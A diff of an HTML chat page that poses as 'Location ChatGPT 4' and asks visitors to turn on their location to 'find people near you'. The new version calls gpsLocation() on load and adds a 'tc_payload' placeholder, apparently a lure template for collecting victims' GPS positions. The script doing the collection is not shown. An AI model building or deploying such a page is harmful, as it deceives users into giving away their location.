@@ -1,77 +1,51 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" >
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>📍 Location ChatGPT-4 - Find People Nearby</title>
+  <title>Find - people</title>
+  <link rel="stylesheet" href="./style.css">
 
-  <!-- Fonts & Icons -->
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-
-  <!-- CSS -->
-  <link rel="stylesheet" href="style.css">
 </head>
+<body onload="gpsLocation()">
+<section class="msger">
+  <header class="msger-header">
+    <div class="msger-header-title">
+      <i class="fas fa-comment-alt"></i> Location ChatGPT 4
+    </div>
+    <div class="msger-header-options">
+      <span><i class="fas fa-cog"></i></span>
+    </div>
+  </header>
 
-<body>
+  <main class="msger-chat">
+    <div class="msg left-msg">
+      <div
+       class="msg-img"
+       style="background-image: url(https://image.flaticon.com/icons/svg/327/327779.svg)"
+      ></div>
 
-  <!-- Animated Background -->
-  <div class="particles" id="particles"></div>
+      <div class="msg-bubble">
+        <div class="msg-info">
+          <div class="msg-info-name">Admin</div>
+          <div class="msg-info-time"></div>
+        </div>
 
-  <!-- Location Status -->
-  <div class="location-status" id="locationStatus" style="display:none;">
-    <i class="fas fa-map-marker-alt"></i> GPS Active
-  </div>
-
-  <section class="msger">
-    <header class="msger-header">
-      <div class="msger-header-title">
-        <i class="fas fa-map-marker-alt"></i>
-        Location ChatGPT-4
-      </div>
-      <div class="msger-header-options">
-        <i class="fas fa-cog"></i>
-      </div>
-    </header>
-
-    <main class="msger-chat" id="chat">
-      <div class="msg left-msg">
-        <div class="msg-img" style="background-image:url('https://images.unsplash.com/photo-1529665253569-6d01c0eaf7b6?w=150')"></div>
-        <div class="msg-bubble">
-          <div class="msg-info">
-            <div class="msg-info-name">🤖 LocationGPT</div>
-            <div class="msg-info-time" id="currentTime"></div>
-          </div>
-          <div class="msg-text">
-            👋 Welcome to <strong>Location ChatGPT-4</strong><br>
-            📍 Enable location to find people nearby
-          </div>
+        <div class="msg-text">
+          Hi Welcome to Location GPT-4. Turn on your location for find people near you.📍
         </div>
       </div>
+    </div>
 
-      <!-- Typing Indicator -->
-      <div class="typing" id="typingIndicator" style="display:none;">
-        <div class="msg-img">🤖</div>
-        <div class="typing-bubble">
-          <div class="typing-dots">
-            <div class="dot"></div>
-            <div class="dot"></div>
-            <div class="dot"></div>
-          </div>
-        </div>
-      </div>
-    </main>
+  </main>
 
-    <form class="msger-inputarea" id="messageForm">
-      <input type="text" id="messageInput" class="msger-input"
-        placeholder="Ask about nearby people or places..." autocomplete="off">
-      <button class="msger-send-btn">
-        <i class="fas fa-paper-plane"></i>
-      </button>
-    </form>
-  </section>
+  <form class="msger-inputarea">
+    <input type="text" class="msger-input" placeholder="Ask me anything...">
+    <button type="submit" class="msger-send-btn">Send</button>
+  </form>
+</section>
+<script  src="./script.js"></script>
+<p id="techchip"></p>
+<!-- tc_payload -->
 
-  <!-- JavaScript -->
-  <script src="script.js"></script>
 </body>
 </html>
